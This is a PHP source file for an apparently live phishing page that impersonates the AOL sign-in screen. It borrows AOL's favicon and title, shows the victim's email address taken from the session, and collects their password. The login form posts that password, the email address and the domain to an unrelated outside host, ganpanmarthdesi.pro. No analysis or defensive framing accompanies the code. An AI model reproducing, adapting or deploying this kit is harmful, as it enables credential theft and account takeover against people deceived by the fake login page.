<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Login - Sign into AOL</title>
<link rel="icon" type="image/png" href="https://s.yimg.com/wm/mbr/images/aol-favicon-v3.png" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 38px;
  width: 100%;
  padding: 0 1px;
  margin: 0;
  background: #fff;
  border: 0px solid #808080;
  border-bottom: 1px solid #d8dade;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  color: #404040;
  }
  input[type=password]:focus {
  outline: none;
  border: 0px solid #4d90fe;
  border-bottom: 1px solid #3399FF;
  }
    .email-text {
      font-family: "Helvetica Neue", Arial, sans-serif;
      font-weight: 500; /* Medium weight */
      font-size: 14px; /* Closest match to the image */
      color: #2c2f33; /* Dark gray, similar to the image */
    }
</style>
<body>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="50"></td>
				<td width="104">
				<img border="0" src="img/header_101.png" width="108" height="84"></td>
				<td>&nbsp;</td>
				<td width="90">
				<img border="0" src="img/header_102.png" width="147" height="84"></td>
				<td width="50"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="10"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td></td>
				<td width="370" height="560" background="img/form.png">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
				   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
					<tr>
						<td height="85"></td>
					</tr>
					<tr>
						<td height="20">
						   <p class="email-text" align="center"><?php echo $users;?>@<?php echo $ddomain;?></p>
						</td>
					</tr>
					<tr>
						<td height="141"></td>
					</tr>
					<tr>
						<td>
						<table border="0" height="38" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="37"></td>
								<td>
								   <input type="hidden" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
								   <input type="password" required placeholder="" name="passwd" value="" autofocus >
								   <input type="hidden" name="link" value="https://login.aol.com" >
								   <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
								   <input type="hidden" name="sender" value="Aol.com" >
								</td>
								<td width="39"></td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="57"></td>
					</tr>
					<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="37">&nbsp;</td>
								<td>
								<input type="image" src="img/btn.png" width="297" height="43"></td>
								<td width="39">&nbsp;</td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="178"></td>
					</tr>
					</form>
				</table>
				</td>
				<td width="90"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="20"></td>
	</tr>
</table>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>